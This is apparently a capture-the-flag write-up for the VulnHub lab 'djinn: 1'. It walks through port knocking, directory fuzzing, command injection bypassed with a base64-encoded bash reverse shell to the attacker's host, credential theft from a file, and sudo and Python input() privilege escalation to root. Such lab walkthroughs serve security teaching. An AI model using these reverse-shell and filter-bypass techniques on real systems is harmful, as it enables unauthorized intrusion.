# Information

- Name: djinn: 1
- Date release: 18 Nov 2019
- Author: 0xmzfr
- Series: djinn
- Platform: VulnHub
- Link: https://www.vulnhub.com/entry/djinn-1,397/
- Difficulty: Begginer to Intermediate

# Write Up

## Enumeration
### Host Discovery
Host Discovery is performed using [arpScan](http://github.com/aalmeidar/Tools). In this lab, the machine ip is _10.0.2.22_.

```Shell
# arpScan.py -r 10.0.2.0/24 -m 2                                                                                                                               
[*] 52:54:00:12:35:00 10.0.2.1
[*] 52:54:00:12:35:00 10.0.2.2
[*] 08:00:27:ef:27:56 10.0.2.3
[*] 08:00:27:1b:7b:89 10.0.2.22
```

### Port Scanning

Port Scanning is realized with [portScan](http://github.com/aalmeidar/Tools). First and foremost, let's discover open ports. 

```Shell
# portScanner.py  -i 10.0.2.22
[p] Scanning Ports: 65535
[*] Port 21 (ftp) open
[*] Port 1337 (unknown) open
[*] Port 7331 (unknown) open
```
##### Banner Grabing
- FTP:
```Shell
# nc 10.0.2.22 21
220 (vsFTPd 3.0.3)
```
- 1337: 
```Shell
# nc 10.0.2.22 1337
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                     

Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(1, '*', 6)
> 
```

- 7331:
```Shell
nc 10.0.2.22 7331
test
<head>
<title>Error response</title>
</head>
<body>
<h1>Error response</h1>
<p>Error code 400.
<p>Message: Bad request syntax ('test').
<p>Error code explanation: 400 = Bad request syntax or unsupported method.
</body>

# whatweb http://10.0.2.22:7331
http://10.0.2.22:7331 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/0.16.0 Python/2.7.15+], IP[10.0.2.22], JQuery, Python[2.7.15+], Script, Title[Lost in space], Werkzeug[0.16.0]
```
---
So, we have a FTP, Quiz/Game and web server. Let's start with FTP.

## FTP
I will start by testing if there is login anonymous and then I will download all the files available.
![FTP](images/ftp.png)

_Creds.txt_ maybe is interesting, but the otheres files are irrelevant. 

## GAME
```Shell
nc 10.0.2.22 1337
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                     

Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(9, '-', 5)
> 4
(7, '/', 7)
> 

```
So, we have to do 1000 math questions to get the gift. Let's create a python script to automate it.

```Python
import socket, re

def operationRequest(s):
    s.recv(4096)
    data = s.recv(4096)
    # Regex for content ...) and between ,
    term1, op, term2 = re.split(r"(.*?),(.*?),(.*?)\)", data.decode().split("\n")[0])[1:-1]
    op = re.split(r"\'(.*?)\'", op)[1] # Removing quotation marks
    result = str(eval(f'{term1} {op} {term2}')) 
    s.send(result.encode())
    s.send("\n".encode())

if __name__ == "__main__":
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.2.22", 1337))
    s.recv(1024) # Banner "Game Time"
    data = s.recv(1024) # First math question that have different message.
    # Regex to content between (...) and ,
    term1, op, term2 = re.split(r"\((.*?),(.*?),(.*?)\)", data.decode())[1:4]
    op = re.split(r"\'(.*?)\'", op)[1] # Removing quotation marks
    result = str(eval(f'{term1} {op} {term2}')) + "\n" 
    s.send(result.encode())
    for i in range(1,1001):
        operationRequest(s)
    data= s.recv(4096)
    print(data.decode())
    s.close()
```

Let's execute it:

```Shell
# python mathPortAuto.py 
Here is your gift, I hope you know what to do with it:

1356, 6784, 3409
```

This looks like port knocking. Let's check if there are filtered ports with nmap.

```Shell
# nmap -sS -n -Pn --min-rate 5000 -p- 10.0.2.22 | grep "filtered"
22/tcp   filtered ssh
```

Let's ping the ports and re scan open ports:
```Shell
# portScanner.py -i 10.0.2.22
[▘] Scanning Ports: 65535
[*] Port 21 (ftp) open
[*] Port 22 (ssh) open
[*] Port 1337 (unknown) open
[*] Port 7331 (unknown) open
```
Now we have access to ssh but the previous credentials do not work. So the web is the only attack vector left.

## Web

_Index.html_ looks irrelevant:
![Index](images/index.png)

So, let's apply fuzzing to find hidden directories and files. _Gobuster_ with _Directory_2.3_Medim_ wordlist report me two interesting directories:

```Shell
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.2.22:7331 -t 100 -x .php,.html,.txt -o fuzzing
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.0.2.22:7331
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/09/06 19:47:39 Starting gobuster in directory enumeration mode
===============================================================
/wish                 (Status: 200) [Size: 385]
/genie                (Status: 200) [Size: 1676]
```
## Exploitation

In _wish_ there is a potencial rce because the output, for example, of id command is on _genie_.
![wish](images/wish.png)
![genie](images/genie.png)
![Source Code Genie](images/source_code_genie.png)

The input filters many words and expressions, so a good way to bypass it is to encode it in base64. Let's try it with a reverse shell written in bash. To make it run on the server we will have to pipe it with base64 and bash. First of all we are going to encode it.

```Shell
# echo "bash -i >& /dev/tcp/10.0.2.19/1234 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTkvMTIzNCAwPiYxCg==
```
The command to be executed on the server is:

```Shell
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjIuMTkvMTIzNCAwPiYx | base64 -d | bash
```
And is successful:
```Shell
nc -lvvnp 1234                                                        
listening on [any] 1234 ...
connect to [10.0.2.19] from (UNKNOWN) [10.0.2.22] 49226
bash: cannot set terminal process group (700): Inappropriate ioctl for device
bash: no job control in this shell
www-data@djinn:/opt/80$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@djinn:/opt/80$ whoami
whoami
www-data
```
## Privilege Escalation

There is a python script that is the filter:

```Python
www-data@djinn:/opt/80$ cat app.py
import subprocess

from flask import Flask, redirect, render_template, request, url_for

app = Flask(__name__)
app.secret_key = "key"

CREDS = "/home/nitish/.dev/creds.txt"

RCE = ["/", ".", "?", "*", "^", "$", "eval", ";"]
...
...
...
...
if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=True)
```
You can see a _creds.txt_ in _/home/nitish/.dev_, let's read the file:

```Shell
www-data@djinn:/opt/80$ cat /home/nitish/.dev/creds.txt
nitish:p4ssw0rdStr3r0n9
```
We have new credentiales for nitish user. The login is successful and new information for privilege escalation comes to light.

```Shell
www-data@djinn:/opt/80$ su nitish
Password: 
nitish@djinn:/opt/80$ sudo -l
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie

```
We can execute genie with the user sam. After several attempts I realize that there is a parameter that with _--help_ does not appear, but with the manual it does:

- Help Panel
```Shell
nitish@djinn:/opt/80$ sudo -u sam genie -h
usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish

I know you've came to me bearing wishes in mind. So go ahead make your wishes.

positional arguments:
  wish                  Enter your wish

optional arguments:
  -h, --help            show this help message and exit
  -g, --god             pass the wish to god
  -p SHELL, --shell SHELL
                        Gives you shell
  -e EXEC, --exec EXEC  execute command

```

- Manual:
```Shell
man(8)                          genie man page                          man(8)

NAME
       genie - Make a wish

SYNOPSIS
       genie [-h] [-g] [-p SHELL] [-e EXEC] wish

DESCRIPTION
       genie would complete all your wishes, even the naughty ones.

       We  all  dream  of getting those crazy privelege escalations, this will
       even help you acheive that.

OPTIONS
       wish

              This is the wish you want to make .

       -g, --god

              Sometime we all would like to make a wish to  god,  this  option
			  let you make wish directly to God;

              Though  genie can't gurantee you that your wish will be heard by
              God, he's a busy man you know;

       -p, --shell

              Well who doesn't love those. You can get shell. Ex: -p "/bin/sh"

       -e, --exec

              Execute command on someone else computer is just too  damn  fun,
              but this comes with some restrictions.

       -cmd

              You know sometime all you new is a damn CMD, windows I love you.

SEE ALSO
       mzfr.github.io

BUGS
       There  are  shit  loads  of bug in this program, it's all about finding
       one.

AUTHOR
       mzfr

1.0                            11 November 2019                         man(8)
```

So, let's try the new parameter:
```Shell
nitish@djinn:/opt/80$ sudo -u sam genie -cmd test
my man!!
$ whoami
sam
$ id
uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
$ 
```

With _sam_ we have access to a script named as lago in /root but nothing relevant:
```Console
sam@djinn:/opt/80$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
Choose a number between 1 to 100: 
Enter your number: 5
Better Luck next time
sam@djinn:/opt/80$ 
```
In _/home/sam_ there is a _.pyc_ that looks like _/root/logo_. We can try to decompile.

With strings looks like _/root/lago_:
```Shell
sam@djinn:/home/sam$ strings /home/sam/.pyc
getuser(
system(
randintc
Working on it!! (
/home/mzfr/scripts/exp.pyt
naughtyboi
Choose a number between 1 to 100: s
Enter your number: s
/bin/shs
Better Luck next time(
inputR
numt
/home/mzfr/scripts/exp.pyt
guessit
Enter the full of the file to read: s!
User %s is not allowed to read %s(
usert
path(
/home/mzfr/scripts/exp.pyt
readfiles
What do you want to do ?s
1 - Be naughtys
2 - Guess the numbers
3 - Read some damn filess
4 - Works
Enter your choice: (
intR
choice(
/home/mzfr/scripts/exp.pyt
options
work your ass off!!s"
Do something better with your life(
/home/mzfr/scripts/exp.pyt
main'
__main__N(
getpassR
randomR
__name__(
/home/mzfr/scripts/exp.pyt
<module>
```

Let's decompile it, for example via online. First create a webserve to pass the file outside the machine:

- VulnHub Machine:
```Shell
sam@djinn:~$ python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
10.0.2.19 - - [07/Sep/2022 00:01:36] "GET /.pyc HTTP/1.1" 200 -
```

- Kali Machine:
```Shell
# wget http://10.0.2.22:8080/.pyc
--2022-09-06 20:31:35--  http://10.0.2.22:8080/.pyc
Connecting to 10.0.2.22:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1749 (1.7K) [application/octet-stream]
Saving to: ‘.pyc’

.pyc                      100%[==================================>]   1.71K  --.-KB/s    in 0s      

2022-09-06 20:31:35 (398 MB/s) - ‘.pyc’ saved [1749/1749]

```

And decompile with [https://www.toolnb.com/tools-lang-en/pyc.html](https://www.toolnb.com/tools-lang-en/pyc.html):

![Decompile](images/decompile.png)

Let's try introducing _num_ in the input:

```Shell
sam@djinn:~$ sudo /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
Choose a number between 1 to 100: 
Enter your number: num
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
lago  proof.sh
# chmod u+x proof.sh
# ./proof.sh
    _                        _             _ _ _ 
   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |
  / _ \ | '_ ` _ \ / _` |_  / | '_ \ / _` | | | |
 / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|
/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)
                                     |___/       
djinn pwned...
__________________________________________________________________________

Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc
Path: /root
Date: Wed Sep 7 00:34:14 IST 2022
Whoami: root
__________________________________________________________________________

By @0xmzfr

Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)
# cat /home/nitish/user.txt
10aay8289ptgguy1pvfa73alzusyyx3c

```
